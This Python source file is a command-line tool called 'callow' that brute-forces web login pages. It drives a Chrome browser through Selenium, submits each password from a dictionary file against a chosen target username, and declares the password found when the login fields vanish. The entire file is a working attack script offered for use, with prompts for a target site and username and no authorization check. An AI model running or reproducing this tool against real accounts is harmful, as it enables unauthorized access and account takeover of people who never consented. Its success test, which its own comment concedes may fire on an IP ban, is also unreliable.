# Importing modules
import sys # Basic functions
import selenium # Selenium automates browsers. That's it!
import requests # Handling HTTP requests
from sys import stdout # For Prompts
from selenium import webdriver # Used to control the browser
from optparse import OptionParser # For argument support
from pynput.keyboard import Key, Controller # Used to press enter

keyboard = Controller()

# Fancy colors
class color:
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    WHITE = '\033[0m'


# Arguments
parser = OptionParser() # Shorten the argument parser function
parser.add_option("--site", dest="website", help="Target login page (http/https only)") # Argument for the target login page
parser.add_option("--usel", dest="usersel", help="Username input selector") # Argument for the css selector of the username input element
parser.add_option("--psel", dest="passsel", help="Password input selector") # Argument for the css selector of the password input element
parser.add_option("--user", dest="username", help="Target username to attack") # Argument for the target username to be attacked
parser.add_option("--pass", dest="passlist", help="Password dictionary") # Arguments for the location of the password dictionary file
(options, args) = parser.parse_args() # Parse the arguments given by the user


# Fancy ASCII Banner
banner = color.PURPLE + '''
     ____      _ _
    / ___|__ _| | | _____      __
   | |   / _` | | |/ _ \\ \ /\\ / /
   | |__| (_| | | | (_) \\ V  V /
    \\____\\__,_|_|_|\\___/ \\_/\\_/

{0}[#] {1}maximousblk/callow@v1.2
'''.format(color.CYAN, color.WHITE)


# Wizard that is presented if executed without any arguments
def wizard():
    print(banner) # Show the banner
    try: # Check if the page is accecible
        website = input(color.GREEN + '\n[~] ' + color.WHITE + 'Target login page (http/https only): ')
        sys.stdout.write(color.GREEN + '[#] ' + color.WHITE + 'Checking if site is accessible ')
        sys.stdout.flush()
        request = requests.get(website) # Send a GET request to the website
        if request.status_code == 200: # If the website exists
            print(color.GREEN + '[OK]\n'+color.WHITE)
        else: # If the website is inaccessible
            print(color.RED + '[X]' + '\n[!] '+color.WHITE + 'Could not connect to ' + website)
            exit()
    except KeyboardInterrupt: # If user exits the program manually
        print(color.RED + '\n[!] '+ color.WHITE + 'Process terminated by user. Exiting...')
        exit()
    except requests.exceptions.MissingSchema: # Protocol (http/https) is missing from the URL
        print(color.RED + '[X]' + '\n[!] '+color.WHITE + 'Invalid URL. Make sure you use http/https only.')
        exit()
    except requests.ConnectTimeout: # If page takes too late to respond
        print(color.RED + '[X]' + '\n[!] '+color.WHITE + 'Connection timed out')
        exit()
    try: # Collect information
        usersel = input( color.GREEN + '[~] ' + color.WHITE + 'Username input selector: ') # Css selector for username input field
        passsel = input( color.GREEN + '[~] ' + color.WHITE + 'Password input selector: ') # Css selector for password input field
        username = input( color.GREEN + '[~] ' + color.WHITE + 'Target username: ') # Username of the target
        passlist = input( color.GREEN + '[~] ' + color.WHITE + 'Password dictionary: ') # Location of the password dictionary/list
        f = open(passlist, 'r') # Open password list
        crack(username, usersel, passsel, passlist, website) # Start the attack
    except KeyboardInterrupt: # If user exits the program manually
        print(color.RED + '\n[!] '+color.WHITE + 'Process terminated by user. Exiting...')
        exit()


# Main brute-force function
def crack(username, usersel, passsel, passlist, website):
    try: # Open password list
        f = open(passlist, 'r')
    except FileNotFoundError: # If list was not found
        print(color.RED + '\n[!] '+color.WHITE + 'Password list not found')
        exit()
    options = webdriver.ChromeOptions()
    options.add_argument("--disable-popup-blocking")
    options.add_argument("--disable-extensions")
    try: # Start the browser
        browser = webdriver.Chrome()
    except selenium.common.exceptions.WebDriverException: # If ChromeDriver binary was not found
        print(color.RED + '\n[!] '+color.WHITE + 'ChromeDriver binary not found')
        exit()
    browser.get(website) # Open target website
    try: # Check if username field css selector is valid
        Sel_user = browser.find_element_by_css_selector(usersel)
    except selenium.common.exceptions.NoSuchElementException: # If the selector is invalid
        print(color.RED + '\n[!] '+ color.WHITE + 'Username field selector is invalid.')
        exit()
    try: # Check if password field css selector is valid
        Sel_pass = browser.find_element_by_css_selector(passsel)
    except selenium.common.exceptions.NoSuchElementException: # If the selector is invalid
        print(color.RED + '\n[!] '+ color.WHITE + 'Password field selector is invalid.')
        exit()
    print(color.GREEN + '\nTarget user: ' + color.RED + username + color.WHITE + '\n') # Print username of the target
    try: # Start the attack
        for password in f: # Run the attack untill the password list is over
            browser.get(website) # Open fresh website
            Sel_user = browser.find_element_by_css_selector(usersel)
            Sel_pass = browser.find_element_by_css_selector(passsel)
            Sel_user.send_keys(username) # Enter username
            Sel_pass.send_keys(password) # Enter password
            keyboard.press(Key.enter)
            keyboard.release(Key.enter) # Enter information
            tried = password
            print(color.GREEN + 'Tried: ' + color.WHITE + tried) # Log last tried password
        print(color.RED + '\n[!] '+color.WHITE + 'Sorry, password could not be found') # Message for if the password list is over and the password was not found
    except KeyboardInterrupt: # If user exits the program manually
        print(color.RED + '\n[!] '+color.WHITE + 'Process terminated by user. Exiting...')
        exit()
    except selenium.common.exceptions.NoSuchElementException: # If the password or username field gets hidden, that means either the password is found if you are IP banned
        print(color.GREEN + '\n[#] ' + color.WHITE + 'Password found: ' + color.CYAN + tried)
        print(color.YELLOW + 'Happy to help ;)' + color.WHITE)
        exit()


# Tests to check if the arguments are valid
if options.website == None and options.usersel == None and options.passsel == None and options.username == None and options.passlist == None: # if no arguments are given
    wizard()
missing_args = ""
if options.website == None:
    missing_args += "--site "
if options.usersel == None:
    missing_args += "--usel "
if options.passsel == None:
    missing_args += "--psel "
if options.username == None:
    missing_args += "--user "
if options.passlist == None:
    missing_args += "--pass"
if missing_args != "": # If any (but not all) arguments are missing
    print(color.RED + '\n[!] '+color.WHITE + 'Missing arguments: ' + missing_args)
    wizard()
else: # If all arguments are present
    print(banner)
    sys.stdout.write(color.GREEN + '[#] ' + color.WHITE + 'Checking if site is accessible ')
    sys.stdout.flush()
    try: # Check if the page is accecible
        request = requests.get(options.website) # Send a GET request to the website
        if request.status_code == 200: # If the website exists
            print(color.GREEN + '[OK]\n'+color.WHITE)
        else: # If the website is inaccessible
            print(color.RED + '[X] ' + '\n[!]'+color.WHITE + 'Could not connect to ' + options.website)
            exit()
    except KeyboardInterrupt: # If user exits the program manually
        print(color.RED + '\n[!] '+color.WHITE + 'Process terminated by user. Exiting...')
        exit()
    except requests.exceptions.MissingSchema: # Protocol (http/https) is missing from the URL
        print(color.RED + '[X] ' + '\n[!]'+color.WHITE + 'Invalid URL. Make sure you use http/https only.')
        exit()
    except requests.ConnectTimeout: # If page takes too late to respond
        print(color.RED + '[X] ' + '\n[!]'+color.WHITE + 'Connection timed out')
        exit()
    crack(options.username, options.usersel, options.passsel, options.passlist, options.website) # Start the attack
